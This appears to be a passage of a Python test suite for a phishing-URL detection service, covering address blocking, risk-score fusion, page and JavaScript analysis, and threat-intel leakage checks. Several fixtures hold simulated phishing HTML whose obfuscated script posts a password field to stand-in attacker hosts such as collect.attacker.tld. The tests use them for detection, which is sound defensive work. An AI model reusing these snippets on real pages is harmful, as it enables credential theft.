        for ip in ("127.0.0.1", "10.1.2.3", "192.168.0.5", "169.254.1.1",
                   "::1", "fe80::1", "0.0.0.0", "224.0.0.1"):
            self.assertTrue(self._blocked(ip), ip)
        for ip in ("8.8.8.8", "1.1.1.1", "93.184.216.34"):
            self.assertFalse(self._blocked(ip), ip)
        # hostnames are not IP literals and must not be classified as blocked
        for host in ("example.com", "sub.example.co.uk", "xn--80ak6aa92e.com"):
            self.assertFalse(self._literal(host), host)

    def test_unparseable_addresses_fail_closed(self):
        self.assertTrue(self._blocked("not-an-ip"))
        self.assertTrue(self._blocked(""))

    def test_redirects_are_not_followed_automatically(self):
        """urllib's own handler would bypass the per-hop address checks."""
        import web_fetch as wf
        h = wf._NoRedirect()
        self.assertIsNone(h.redirect_request(None, None, 302, "", {}, "http://x/"))


class TestRiskEngine(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        import risk_engine
        cls.RE = risk_engine

    def test_missing_layer_is_not_treated_as_clearance(self):
        """'We could not look' must not lower the score."""
        out = self.RE.combine(80, web=None)
        self.assertEqual(out["risk_score"], 80)
        self.assertFalse(out["layers"]["website"]["available"])
        self.assertIn("neither supporting nor clearing",
                      out["fusion"]["method"])

    def test_dns_layer_is_always_declared_unavailable(self):
        out = self.RE.combine(50)
        dns = out["layers"]["dns"]
        self.assertFalse(dns["available"])
        self.assertIsNone(dns["score"])
        self.assertTrue(dns["reason"])

    def test_website_layer_below_its_threshold_does_not_inflate(self):
        """The bug this guards: averaging two scales. A page scoring 94 when
        its model's threshold is 95 means 'not malicious' and must not push a
        benign URL upward."""
        out = self.RE.combine(7, web={"available": True, "score": 94,
                                      "threshold_score": 95, "features": {}})
        self.assertLessEqual(out["risk_score"], 10)
        self.assertEqual(out["risk_band"]["key"], "low")

    def test_website_layer_above_threshold_pushes_up(self):
        out = self.RE.combine(50, web={"available": True, "score": 99,
                                       "threshold_score": 95, "features": {}})
        self.assertGreater(out["risk_score"], 50)
        self.assertLessEqual(out["risk_score"], 50 + self.RE.WEB_MAX_PUSH_UP)

    def test_push_is_asymmetric(self):
        self.assertGreater(self.RE.WEB_MAX_PUSH_UP, self.RE.WEB_MAX_PUSH_DOWN,
                           "absence of evidence must move less than evidence")

    def test_decisive_patterns_require_a_combination(self):
        """Brand mismatch ALONE flagged Wikipedia's phishing article at 60."""
        article = self.RE.combine(15, web={
            "available": True, "score": 1, "threshold_score": 95,
            "features": {"brand_domain_mismatch": 1, "has_credential_pair": 0}})
        self.assertEqual(article["fusion"]["pattern_floors"], [])
        self.assertEqual(article["risk_band"]["key"], "low")

        impersonation = self.RE.combine(15, web={
            "available": True, "score": 1, "threshold_score": 95,
            "features": {"brand_domain_mismatch": 1, "has_credential_pair": 1}})
        self.assertTrue(impersonation["fusion"]["pattern_floors"])
        self.assertGreaterEqual(impersonation["risk_score"], 60)

    def test_offsite_password_form_raises_the_floor(self):
        out = self.RE.combine(10, web={
            "available": True, "score": 1, "threshold_score": 95,
            "features": {"password_form_posts_offsite": 1}})
        self.assertGreaterEqual(out["risk_score"], 70)

    def test_score_never_reads_as_certainty(self):
        for u in (0, 1, 50, 99, 100):
            for w in (None, {"available": True, "score": 99,
                             "threshold_score": 95, "features": {}}):
                out = self.RE.combine(u, web=w)
                self.assertTrue(1 <= out["risk_score"] <= 99)

    def test_page_signals_carry_evidence_and_avoid_proof_language(self):
        sig = self.RE.page_signals({
            "password_form_posts_offsite": 1, "has_credential_pair": 1,
            "brand_domain_mismatch": 1, "num_zero_size_iframes": 1,
            "obfuscation_signal_count": 3, "page_is_https": 1})
        self.assertTrue(sig["warning"])
        for s in sig["warning"]:
            self.assertTrue(s["evidence"])
            blob = (s["text"] + " " + s["evidence"]).lower()
            for banned in ("proof", "confirmed", "definitely", "guaranteed"):
                self.assertNotIn(banned, blob, s["text"])

    def test_breakdown_marks_unavailable_rows(self):
        out = self.RE.combine(40)
        rows = self.RE.breakdown_rows(out, None)
        labels = {r["label"]: r for r in rows}
        self.assertTrue(labels["URL pattern"]["available"])
        for lab in ("Website structure", "Credential form", "Form destination",
                    "Brand/domain match", "DNS/WHOIS/certificates"):
            self.assertFalse(labels[lab]["available"], lab)
            self.assertEqual(labels[lab]["value"], "Not available")


class TestWebsiteAPI(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models missing")
        import app as flask_app
        cls.mod = flask_app
        flask_app.app.config["TESTING"] = True
        cls.client = flask_app.app.test_client()

    def setUp(self):
        with self.mod._RATE_LOCK:
            self.mod._RATE.clear()

    def test_website_analysis_is_opt_in(self):
        d = json.loads(self.client.post("/api/scan", json={"url": BENIGN}).data)
        self.assertFalse(d["website_analysed"])
        self.assertIsNone(d["web_model_version"])
        w = d["assessment"]["layers"]["website"]
        self.assertFalse(w["available"])
        self.assertEqual(w["code"], "not_requested")

    def test_hostname_scope_states_page_was_unavailable(self):
        r = self.client.post("/api/scan",
                             json={"url": PHISHY, "scope": "hostname"})
        if r.status_code == 503:
            raise unittest.SkipTest("hostname model not trained")
        w = json.loads(r.data)["assessment"]["layers"]["website"]
        self.assertFalse(w["available"])
        self.assertIn("Hostname-only assessment", w["reason"])
        self.assertIn("webpage content was unavailable", w["reason"])

    def test_unreachable_page_fails_open(self):
        """A page that cannot be fetched must not break the scan."""
        d = json.loads(self.client.post("/api/scan", json={
            "url": "http://this-host-should-not-resolve-urlguard.invalid/x",
            "analyze_website": True}).data)
        self.assertIn("assessment", d)
        self.assertFalse(d["website_analysed"])
        self.assertFalse(d["assessment"]["layers"]["website"]["available"])
        self.assertTrue(d["assessment"]["layers"]["website"]["reason"])

    def test_breakdown_always_present(self):
        d = json.loads(self.client.post("/api/scan", json={"url": PHISHY}).data)
        rows = d["assessment"]["breakdown"]
        self.assertEqual([r["label"] for r in rows][:2],
                         ["URL pattern", "Website structure"])
        self.assertEqual(rows[-1]["label"], "DNS/WHOIS/certificates")

    def test_url_only_score_is_preserved_alongside_fused(self):
        d = json.loads(self.client.post("/api/scan", json={"url": PHISHY}).data)
        a = d["assessment"]
        self.assertIn("url_only_risk_score", a)
        self.assertEqual(a["url_only_risk_score"], a["risk_score"])

    def test_meta_declares_the_fetching_boundary(self):
        m = json.loads(self.client.get("/api/meta").data)
        self.assertTrue(m["url_analysis_never_contacts_url"])
        self.assertTrue(m["website_analysis_contacts_url"])
        self.assertFalse(m["website_analysis_default"])
        self.assertTrue(m["website_analysis_safety"])


# ===========================================================================
#  Page layers: JavaScript, redirects, phishing-kit fingerprints
# ===========================================================================
class TestPageLayers(unittest.TestCase):
    """src/page_layers.py is the single implementation both the dataset
    builder and the live server use. These tests pin the behaviour that
    parity depends on."""

    def _res(self, html, requested="http://bit.ly/x",
             final="https://a.example/p", redirects=None):
        return {"html": html, "requested_url": requested, "final_url": final,
                "redirects": redirects if redirects is not None else []}

    def test_nothing_is_executed_and_external_scripts_are_not_fetched(self):
        import page_layers
        html = ('<html><script src="http://attacker.tld/payload.js"></script>'
                '<script>eval(atob("YWxlcnQoMSk="))</script></html>')
        out = page_layers.analyse_page(self._res(html))
        # The external script is counted, never retrieved.
        self.assertEqual(out["features"]["js_external_scripts"], 1)
        self.assertEqual(out["js"]["external_not_fetched"], 1)
        # Only the inline body is measured.
        self.assertEqual(out["features"]["js_inline_scripts"], 1)
        self.assertIn("eval_call", out["js"]["hits"])
        self.assertIn("base64_decode", out["js"]["hits"])
        self.assertIn("No script was executed", out["js"]["method"])

    def test_obfuscation_plus_exfiltration_is_a_combination_not_a_single_hit(self):
        import page_layers
        # fetch() alone must not trip the combined flag.
        plain = page_layers.analyse_page(self._res(
            "<script>fetch('/api/items')</script>"))["features"]
        self.assertEqual(plain["js_obfuscated_and_exfil"], 0)

        kit = page_layers.analyse_page(self._res(
            "<script>var _0xabcd=atob('eA==');eval(unescape(_0xabcd));"
            "fetch('http://evil.tld/c',{method:'POST'})</script>"))["features"]
        self.assertEqual(kit["js_obfuscated_and_exfil"], 1)

    def test_empty_features_states_no_page_rather_than_an_empty_page(self):
        import page_layers
        empty = page_layers.empty_features()
        self.assertEqual(set(empty), set(page_layers.LAYER_FEATURE_NAMES))
        self.assertTrue(all(v == 0 for v in empty.values()))
        # A page with no scripts is a DIFFERENT row from no page at all; the
        # distinction is carried by the availability flag, not by these zeros.
        blank = page_layers.analyse_page(self._res("<html><body>hi</body></html>"))
        self.assertEqual(blank["features"]["js_inline_scripts"], 0)

    def test_shortener_and_downgrade_are_detected_in_the_chain(self):
        import page_layers
        out = page_layers.analyse_page(self._res(
            "<html></html>", requested="http://bit.ly/abc",
            final="http://other.example/login",
            redirects=[{"from": "http://bit.ly/abc", "status": 301,
                        "to": "http://other.example/login"}]))
        f = out["features"]
        self.assertEqual(f["redirect_start_is_shortener"], 1)
        self.assertEqual(f["redirect_domain_changed"], 1)
        self.assertEqual(f["redirect_final_is_https"], 0)

    def test_fingerprint_is_stable_and_near_duplicates_are_close(self):
        import page_layers
        from kit_similarity import hamming, NEAR_DUPLICATE_DISTANCE
        a = ('<html><body><form action="/go"><input type=text name=u>'
             '<input type=password name=p><button>Go</button></form></body></html>')
        # Same kit, different wording and one extra paragraph.
        b = ('<html><body><form action="/go"><input type=text name=u>'
             '<input type=password name=p><button>Sign in</button></form>'
             '<p>hello</p></body></html>')
        fa = page_layers.analyse_page(self._res(a))["fingerprint"]
        fb = page_layers.analyse_page(self._res(b))["fingerprint"]
        self.assertEqual(fa, page_layers.analyse_page(self._res(a))["fingerprint"])
        self.assertLessEqual(hamming(fa["tag_simhash"], fb["tag_simhash"]),
                             NEAR_DUPLICATE_DISTANCE)
        # Identical form skeletons regardless of the surrounding prose.
        self.assertEqual(fa["form_sha"], fb["form_sha"])

    def test_malformed_html_does_not_raise(self):
        import page_layers
        for html in ["", "<html><script>", "<<<>>>", "<form><input type=",
                     "\x00\x01binary"]:
            out = page_layers.analyse_page(self._res(html))
            self.assertEqual(set(out["features"]),
                             set(page_layers.LAYER_FEATURE_NAMES))


# ===========================================================================
#  Fusion meta-model (serving side)
# ===========================================================================
class TestFusionServing(unittest.TestCase):

    def setUp(self):
        import fusion
        self.fusion = fusion
        if not fusion.available():
            self.skipTest("no fusion model installed")

    def test_declines_when_no_page_was_retrieved(self):
        # The single most important behaviour: absent evidence must not be
        # scored as innocence. None means "no fused score", not "low risk".
        self.assertIsNone(self.fusion.score(
            0.9, 0.63, {"available": False, "reason": "dns_failed"}, None, None))
        self.assertIsNone(self.fusion.score(0.9, 0.63, None, None, None))
        # A layer marked available but carrying no probability is also refused.
        self.assertIsNone(self.fusion.score(
            0.9, 0.63, {"available": True, "raw_probability": None}, {}, {}))

    def test_produces_a_calibrated_probability_in_range(self):
        import page_layers
        out = self.fusion.score(
            0.9, 0.63, {"available": True, "raw_probability": 0.95},
            {"is_login_page": 1, "has_credential_pair": 1},
            page_layers.empty_features())
        self.assertIsNotNone(out)
        self.assertGreaterEqual(out["probability"], 0.0)
        self.assertLessEqual(out["probability"], 1.0)
        self.assertGreaterEqual(out["score"], 1)
        self.assertLessEqual(out["score"], 99)
        self.assertEqual(out["method"], "calibrated_meta_model")

    def test_it_is_not_an_average_of_the_layer_scores(self):
        """The requirement was explicitly a learned combination. Verify the
        output is not reproducible as the mean of its inputs."""
        import page_layers
        blank = page_layers.empty_features()
        for u, w in [(0.9, 0.1), (0.1, 0.9), (0.8, 0.8), (0.2, 0.3)]:
            out = self.fusion.score(
                u, 0.63, {"available": True, "raw_probability": w}, {}, blank)
            if out is None:
                continue
            self.assertNotAlmostEqual(out["probability"], (u + w) / 2.0,
                                      places=2,
                                      msg=f"fusion looks like a mean at {u}/{w}")

    def test_missing_inputs_are_reported_not_hidden(self):
        out = self.fusion.score(
            0.9, 0.63, {"available": True, "raw_probability": 0.95}, {}, {})
        self.assertIsNotNone(out)
        self.assertIn("inputs_missing", out)
        self.assertEqual(out["inputs_present"] + len(out["inputs_missing"]),
                         out["inputs_total"])
        # With neither page nor layer features supplied, most inputs are
        # absent and the result must say so rather than imply a full reading.
        self.assertGreater(len(out["inputs_missing"]), 0)

    def test_undecided_flag_tracks_the_threshold_margin(self):
        import page_layers
        blank = page_layers.empty_features()
        thr = self.fusion.get_bundle()["threshold"]
        seen = False
        for u in [i / 20 for i in range(21)]:
            for w in [i / 20 for i in range(21)]:
                out = self.fusion.score(
                    u, 0.63, {"available": True, "raw_probability": w}, {}, blank)
                if out is None:
                    continue
                expect = abs(out["probability"] - thr) <= self.fusion.UNDECIDED_MARGIN
                self.assertEqual(out["undecided"], expect)
                seen = seen or out["undecided"]
        self.assertTrue(seen, "no undecided case found across the input grid")

    def test_inference_failure_fails_open(self):
        """A broken fusion model must leave the URL assessment intact."""
        bundle = self.fusion.get_bundle()
        real = bundle["model"]

        class Broken:
            def predict_proba(self, X):
                raise RuntimeError("boom")

        bundle["model"] = Broken()
        try:
            self.assertIsNone(self.fusion.score(
                0.9, 0.63, {"available": True, "raw_probability": 0.95}, {}, {}))
        finally:
            bundle["model"] = real

    def test_model_card_records_provenance_and_limits(self):
        info = self.fusion.model_info()
        for key in ("model_version", "url_model_version", "web_model_version",
                    "dataset_version", "fitted_on_rows", "tested_on_rows"):
            self.assertIsNotNone(info.get(key), key)
        self.assertTrue(info["limitations"])


# ===========================================================================
#  Threat-intel target leakage -- the bug this project actually hit
# ===========================================================================
class TestIntelLeakageIsExcluded(unittest.TestCase):

    def test_intel_features_are_not_fusion_inputs(self):
        """On this dataset `intel_url_match` reproduces the label at ROC-AUC
        0.9997, because the blocklist snapshots ARE where the malicious labels
        came from. Including it produced a meaningless ROC-AUC of 1.0000. It
        must never be a learned input again."""
        import fusion
        from threat_intel import INTEL_FEATURE_NAMES
        bundle = fusion.get_bundle()
        if bundle is None:
            self.skipTest("no fusion model installed")
        overlap = set(bundle["feature_names"]) & set(INTEL_FEATURE_NAMES)
        self.assertEqual(overlap, set(),
                         f"threat-intel features leaked into the stacker: {overlap}")

    def test_the_training_script_audits_every_raw_input(self):
        import train_fusion
        self.assertLessEqual(train_fusion.LEAK_AUC, 0.99)
        # Base-model scores are legitimately predictive and exempt; raw
        # evidence features are not.
        self.assertIn("url_score", train_fusion.BASE_SCORE_INPUTS)
        self.assertIn("web_score", train_fusion.BASE_SCORE_INPUTS)
        self.assertNotIn("is_login_page", train_fusion.BASE_SCORE_INPUTS)


# ===========================================================================
#  Insufficient Evidence band
# ===========================================================================
class TestInsufficientEvidenceBand(unittest.TestCase):

    def test_band_does_not_claim_safety(self):
        from assessment import INSUFFICIENT_EVIDENCE_BAND as b
        self.assertEqual(b["key"], "insufficient")
        # The wording must not let a reader take "undecided" for "fine".
        text = b["description"].lower()
        self.assertIn("unresolved", text)
        for forbidden in ("safe", "no risk", "clean", "legitimate"):
            self.assertNotIn(f" {forbidden} ", f" {text} ",
                             f"band description implies {forbidden!r}")

    def test_it_is_distinct_from_every_numeric_band(self):
        import assessment
        keys = {b[3] for b in assessment.RISK_BANDS}
        self.assertNotIn("insufficient", keys)


# ===========================================================================
#  End-to-end scan with the website layer, using a stubbed fetch
# ===========================================================================
class TestFusedScanEndToEnd(unittest.TestCase):
    """Exercises the real /api/scan path with the network stubbed out. No
    request leaves the machine: `web_fetch` is replaced with a canned result,
    which is also the only honest way to test a phishing page."""

    PHISH_PAGE = (
        '<html><head><title>Sign in to your account</title></head><body>'
        '<form action="http://collect.attacker.tld/p" method="post">'
        '<input type="text" name="email"><input type="password" name="pw">'
        '<button>Sign in</button></form>'
        '<img src="https://www.paypal.com/logo.png">'
        '<script>var _0x1a2b=atob("Zg==");eval(unescape(_0x1a2b));'
        'fetch("http://collect.attacker.tld/k",{method:"POST",'
        'body:document.getElementById("pw").value});'
        'document.addEventListener("contextmenu",function(e){e.preventDefault()});'
        '</script></body></html>')

    BENIGN_PAGE = (
        '<html><head><title>Docs</title></head><body><h1>Reference</h1>'
        '<p>' + ("documentation text " * 60) + '</p>'
        '<a href="/guide">Guide</a><a href="/api">API</a>'
        '</body></html>')

    @classmethod
    def setUpClass(cls):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models missing")
        import app as flask_app
        cls.mod = flask_app
        if flask_app.get_web_bundle() is None:
            raise unittest.SkipTest("website model not trained")
        flask_app.app.config["TESTING"] = True
        cls.client = flask_app.app.test_client()

    def setUp(self):
        with self.mod._RATE_LOCK:
            self.mod._RATE.clear()
        self._real_fetch = self.mod.web_fetch

    def tearDown(self):
        self.mod.web_fetch = self._real_fetch

    def _stub(self, html, final_url, redirects=None, status=200):
        def fake(url, **kw):
            return {
                "html": html, "requested_url": url, "final_url": final_url,
                "status": status, "redirect_count": len(redirects or []),
                "redirects": redirects or [], "bytes": len(html),
                "truncated": False, "tls_verified": final_url.startswith("https"),
                "elapsed_ms": 12.0, "fetched_at": "2026-01-01T00:00:00+00:00",
            }
        self.mod.web_fetch = fake

    def _scan(self, url):
        r = self.client.post("/api/scan",
                             json={"url": url, "analyze_website": True})
        self.assertEqual(r.status_code, 200, r.data[:300])
        return json.loads(r.data)["assessment"]

    def test_phishing_page_reports_js_and_form_signals(self):
        self._stub(self.PHISH_PAGE, "http://login-paypal-verify.cfd/signin")
        a = self._scan("http://login-paypal-verify.cfd/signin")
        w = a["layers"]["website"]
        self.assertTrue(w["available"])
        # The JS layer ran and its findings are attributed to it.
        self.assertIsNotNone(w["javascript"])
        self.assertIn("eval_call", w["javascript"]["hits"])
        sources = {s.get("source") for s in a["signals"]["warning"]}
        self.assertIn("javascript", sources)
        # Nothing was executed to learn that.
        self.assertIn("No script was executed", w["javascript"]["method"])

    def test_fusion_model_supplies_the_headline_when_a_page_was_read(self):
        import fusion
        if not fusion.available():
            self.skipTest("no fusion model installed")
        self._stub(self.PHISH_PAGE, "http://login-paypal-verify.cfd/signin")
        a = self._scan("http://login-paypal-verify.cfd/signin")
        self.assertEqual(a["fusion"]["headline_source"], "calibrated_meta_model")
        m = a["fusion"]["model"]
        self.assertIsNotNone(m)
        self.assertEqual(m["method"], "calibrated_meta_model")
        # The URL-only score is preserved beside the fused one, never replaced.
        self.assertIn("url_only_risk_score", a)
        self.assertIsInstance(a["url_only_risk_score"], int)

    def test_fetch_failure_falls_back_to_the_url_assessment(self):
        from web_fetch import FetchError

        def boom(url, **kw):
            raise FetchError("The hostname did not resolve.", "dns_failed")
        self.mod.web_fetch = boom

        a = self._scan("http://login-paypal-verify.cfd/signin")
        w = a["layers"]["website"]
        self.assertFalse(w["available"])
        self.assertEqual(w["code"], "dns_failed")
        # Fail-open: the URL verdict stands untouched and no fused score is
        # invented from the page that could not be read.
        self.assertEqual(a["risk_score"], a["url_only_risk_score"])
        self.assertEqual(a["fusion"]["headline_source"], "rule_engine")
        self.assertIsNone(a["fusion"]["model"])

    def test_a_benign_page_does_not_acquire_page_warnings(self):
        self._stub(self.BENIGN_PAGE, "https://docs.example.org/guide")
        a = self._scan("https://docs.example.org/guide")
        self.assertTrue(a["layers"]["website"]["available"])
        js_sigs = [s for s in a["signals"]["warning"]
                   if s.get("source") == "javascript"]
        self.assertEqual(js_sigs, [], f"benign page flagged: {js_sigs}")

    def test_redirect_chain_through_a_shortener_is_surfaced(self):
        self._stub(self.BENIGN_PAGE, "http://final.example/login",
                   redirects=[{"from": "http://bit.ly/abc123", "status": 302,
                               "to": "http://final.example/login"}])
        a = self._scan("http://bit.ly/abc123")
        ra = a["layers"]["website"]["redirect_analysis"]
        self.assertIsNotNone(ra)
        self.assertEqual(ra["features"]["redirect_start_is_shortener"], 1)
        self.assertEqual(ra["features"]["redirect_domain_changed"], 1)

    def test_page_layer_crash_does_not_lose_the_page_score(self):
        """A failure in the extra layers must degrade them, not the scan."""
        import app as flask_app
        self._stub(self.PHISH_PAGE, "http://login-paypal-verify.cfd/signin")
        real = flask_app.analyse_page

        def broken(res):
            raise RuntimeError("layer exploded")
        flask_app.analyse_page = broken
        try:
            a = self._scan("http://login-paypal-verify.cfd/signin")
        finally:
            flask_app.analyse_page = real
        w = a["layers"]["website"]
        self.assertTrue(w["available"], "page score lost to a layer crash")
        self.assertIsNotNone(w["score"])
        self.assertIsNone(w["javascript"])

    def test_response_never_asserts_confirmed_malicious(self):
        self._stub(self.PHISH_PAGE, "http://login-paypal-verify.cfd/signin")
        a = self._scan("http://login-paypal-verify.cfd/signin")
        blob = json.dumps(a).lower()
        for phrase in ("confirmed malicious", "definitely", "guaranteed",
                       "is malware", "certainly malicious"):
            self.assertNotIn(phrase, blob, f"response claims certainty: {phrase}")


# ===========================================================================
#  Stub/contract parity -- a test double that does not match the real thing
#  tests nothing. These pin the shapes the stubs above rely on.
# ===========================================================================
class TestFetchContract(unittest.TestCase):

    def test_redirect_hops_are_keyed_from_to_status(self):
        """src/web_fetch.py records hops as {from, to, status}, and
        redirect_analysis reads exactly those keys. An earlier stub in this
        file invented {status, location}; the analyser then read empty
        strings, resolved them to the unparsed-domain sentinel, and reported
        two distinct domains for a single-domain chain. Pin the contract."""
        import inspect
        import web_fetch
        src = inspect.getsource(web_fetch)
        self.assertIn('{"from": current, "to": nxt, "status": status}', src)

        from redirect_analysis import analyse
        same = analyse(
            "http://a.example/x", "http://a.example/y",
            [{"from": "http://a.example/x", "to": "http://a.example/y",
              "status": 302}])["features"]
        self.assertEqual(same["redirect_distinct_domains"], 1)
        self.assertEqual(same["redirect_cross_domain_hops"], 0)
        self.assertEqual(same["redirect_domain_changed"], 0)

        cross = analyse(
            "http://a.example/x", "http://b.example/y",
            [{"from": "http://a.example/x", "to": "http://b.example/y",
              "status": 302}])["features"]
        self.assertEqual(cross["redirect_distinct_domains"], 2)
        self.assertEqual(cross["redirect_cross_domain_hops"], 1)
        self.assertEqual(cross["redirect_domain_changed"], 1)

    def test_simhash_is_exposed_in_a_form_javascript_can_hold(self):
        """A 64-bit integer loses precision as a JSON number in the browser.
        The hex string is what any non-Python consumer must use."""
        from kit_similarity import fingerprint
        fp = fingerprint('<html><body><form><input type=password></form></body></html>')
        self.assertIn("tag_simhash_hex", fp)
        self.assertEqual(len(fp["tag_simhash_hex"]), 16)
        self.assertEqual(int(fp["tag_simhash_hex"], 16), fp["tag_simhash"])
        # Demonstrate the precision loss the hex form exists to avoid.
        self.assertLess(fp["tag_simhash"], 2 ** 64)

    def test_web_fetch_result_carries_every_key_the_layers_need(self):
        import inspect
        import web_fetch
        src = inspect.getsource(web_fetch)
        for key in ("html", "final_url", "requested_url", "redirects",
                    "status", "redirect_count", "truncated", "tls_verified"):
            self.assertIn(f'"{key}"', src, f"web_fetch no longer returns {key}")


# ===========================================================================
#  Infrastructure graph
# ===========================================================================
class TestInfraGraph(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        import infra_graph
        cls.mod = infra_graph
        cls.g = infra_graph.build()
        if not cls.g.get("available"):
            raise unittest.SkipTest(cls.g.get("reason", "no corpus"))

    def test_it_declares_the_edges_it_cannot_have(self):
        """The graph is built without DNS, WHOIS, ASN or CT data. An empty
        picture must not be mistaken for a complete one."""
        missing = self.g["missing_edge_types"]
        for kind in ("same_ip_resolved", "same_registrant", "same_asn",
                     "same_certificate"):
            self.assertIn(kind, missing)
            self.assertTrue(missing[kind])
        self.assertIn("absence of an edge is not evidence", self.g["limitation"])

    def test_graph_is_linear_not_quadratic_in_cluster_size(self):
        """A 186-domain cluster once produced 17,205 pairwise edges. Members
        now attach to a cluster node instead."""
        clusters = self.g["kit_clusters"]
        if not clusters:
            self.skipTest("no clusters in this corpus")
        biggest = max(c["size"] for c in clusters)
        self.assertGreater(biggest, 2)
        # Edges contributed by a cluster equal its membership, not its pairs.
        struct_edges = [e for e in self.g["edges"]
                        if e["kind"] == "shared_structure"]
        self.assertLessEqual(len(struct_edges),
                             sum(c["size"] for c in clusters))
        self.assertLess(len(struct_edges), biggest * (biggest - 1) / 2)

    def test_clusters_report_label_composition_rather_than_asserting_a_kit(self):
        """Clustering uses no labels. The observed composition is attached so
        a reader can tell a 198/0 malicious cluster from a 0/17 benign one."""
        for c in self.g["kit_clusters"]:
            self.assertIn("pages_malicious", c)
            self.assertIn("pages_benign", c)
            self.assertGreaterEqual(c["size"], 2)
            # Distinct domains only -- a cluster is about domains, not pages.
            self.assertEqual(len(c["domains"]), len(set(c["domains"])))
        blob = json.dumps(self.g).lower()
        self.assertNotIn("phishing kit confirmed", blob)

    def test_formless_pages_are_excluded_not_clustered_on_emptiness(self):
        """Near-empty pages are structurally identical to each other and
        related in no way. They must not form clusters."""
        for c in self.g["kit_clusters"]:
            self.assertTrue(c["form_fingerprint"],
                            "a cluster was keyed on an absent form")

    def test_neighbours_of_an_unknown_domain_is_empty_not_an_error(self):
        r = self.mod.neighbours(self.g, "https://this-domain-is-not-in-the-corpus.example/x")
        self.assertTrue(r["available"])
        self.assertFalse(r["in_graph"])
        self.assertEqual(r["edges"], [])
        self.assertIn("says nothing about it", r["note"])

    def test_unavailable_corpus_reports_a_reason(self):
        g = self.mod.build("data/does_not_exist_xyz.csv")
        self.assertFalse(g["available"])
        self.assertIn("does not exist", g["reason"])


class TestGraphAPI(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        if not os.path.exists(MODEL_PATH):
            raise unittest.SkipTest("models missing")
        import app as flask_app
        cls.mod = flask_app
        flask_app.app.config["TESTING"] = True
        cls.client = flask_app.app.test_client()

    def setUp(self):
        with self.mod._RATE_LOCK:
            self.mod._RATE.clear()

    def test_graph_endpoint_states_its_limits(self):
        d = json.loads(self.client.get("/api/graph").data)
        if not d.get("available"):
            self.assertIn("reason", d)
            return
        self.assertIn("missing_edge_types", d)
        self.assertIn("limitation", d)
        self.assertGreaterEqual(d["node_count"], 0)

    def test_graph_domain_filter_handles_an_unseen_domain(self):
        d = json.loads(self.client.get(
            "/api/graph?domain=nowhere-at-all.example").data)
        if not d.get("available"):
            self.skipTest("no graph built")
        self.assertFalse(d["in_graph"])
        self.assertEqual(d["edges"], [])
